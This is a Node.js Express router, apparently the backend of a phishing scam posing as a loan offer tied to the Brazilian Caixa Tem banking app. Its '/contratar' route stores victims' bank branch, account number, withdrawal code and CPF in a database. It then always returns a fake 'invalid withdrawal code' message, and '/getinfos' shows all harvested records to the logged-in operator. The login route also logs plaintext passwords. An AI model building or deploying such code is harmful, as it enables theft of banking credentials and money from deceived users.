import express from 'express';
import bcrypt from 'bcryptjs';
import conexao from './conexao.js';
import Joi from 'joi'; // Biblioteca de validação

const rota = express.Router();

// Schema de validação para login
const loginSchema = Joi.object({
    usuario: Joi.string().email().required(),
    senha: Joi.string().min(6).required()
});

// Rota de Login
rota.post('/login', async (req, res) => {
    const { usuario, senha } = req.body;

    // Validação dos dados de login
    const { error } = loginSchema.validate({ usuario, senha });
    if (error) {
        return res.status(400).json({ erro: 'Usuário ou senha inválidos.' });
    }

    console.log('Dados recebidos:', { usuario, senha });

    try {
        const query = "SELECT * FROM usuarios WHERE usuario = ?";
        conexao.query(query, [usuario], async (erro, result) => {
            if (erro) {
                console.log("Erro no banco de dados:", erro);
                return res.status(500).json({ erro: 'Erro no servidor de banco de dados.' });
            }

            if (result.length === 0) {
                console.log("Erro: Usuário não encontrado");
                return res.status(400).json({ erro: 'Usuário ou senha incorretos.' });
            }

            const usuarioEncontrado = result[0];
            const senhaCorreta = await bcrypt.compare(senha, usuarioEncontrado.senha);

            if (!senhaCorreta) {
                console.log("Erro: Senha incorreta");
                return res.status(400).json({ erro: 'Usuário ou senha incorretos.' });
            }

            // Configurando a sessão após login bem-sucedido
            req.session.usuarioId = usuarioEncontrado.id;
            req.session.usuario = usuarioEncontrado.usuario;

            req.session.save(err => {
                if (err) {
                    console.log("Erro ao salvar sessão:", err);
                    return res.status(500).json({ erro: 'Erro ao salvar sessão.' });
                }
                return res.status(200).json({ mensagem: 'Login bem-sucedido.', redirectTo: '/dashboard' });
            });
        });
    } catch (error) {
        console.log("Erro no servidor:", error);
        return res.status(500).json({ erro: 'Erro no servidor.' });
    }
});

// Rota da Dashboard
rota.get('/dashboard', (req, res) => {
    console.log('Sessão:', req.session); // Verifique o conteúdo da sessão

    if (req.session.usuarioId) {
        res.json({
            mensagem: 'Bem-vindo à sua dashboard!',
            usuario: req.session.usuario
        });
    } else {
        res.status(401).json({ erro: 'Você precisa estar logado para acessar a dashboard.' });
    }
});

// Rota para obter dados bancários
rota.get('/getinfos', (req, res) => {
    if (req.session.usuarioId) {
        const query = "SELECT * FROM dados";

        conexao.query(query, (err, results) => {
            if (err) {
                console.error("Erro ao consultar dados:", err);
                return res.status(500).json({ erro: 'Erro interno do servidor.' });
            }

            if (results.length > 0) {
                res.json({ dados: results });
            } else {
                res.status(404).json({ erro: 'Nenhum dado encontrado.' });
            }
        });
    } else {
        res.status(401).json({ erro: 'Você precisa estar logado para acessar as informações.' });
    }
});

// Rota para logout
rota.post('/logout', (req, res) => {
    req.session.destroy((err) => {
        if (err) {
            return res.status(500).send({ erro: 'Erro ao tentar deslogar.' });
        }
        res.clearCookie('connect.sid');
        res.status(200).send({ mensagem: 'Logout realizado com sucesso.' });
    });
});

// Rota para contratar empréstimo
rota.post('/contratar', (req, res) => {
    const { agencia, conta, codigoSaque, cpf } = req.body;

    // Validação simples para dados de empréstimo
    if (!agencia || !conta || !codigoSaque || !cpf) {
        return res.status(400).json({ erro: 'Todos os campos são obrigatórios.' });
    }

    const query = 'INSERT INTO dados (agencia, conta, codigo_saque, cpf) VALUES (?, ?, ?, ?)';
    const values = [agencia, conta, codigoSaque, cpf];

    conexao.query(query, values, (err, results) => {
        if (err) {
            console.error('Erro ao inserir dados no MySQL: ', err);
            return res.status(500).json({ erro: 'Erro ao processar a solicitação.' });
        }

        res.status(200).json({
            status: 'sucesso',
            message: 'Código de saque inválido, verifique o código em seu aplicativo Caixa Tem!'
        });
    });
});

export default rota;
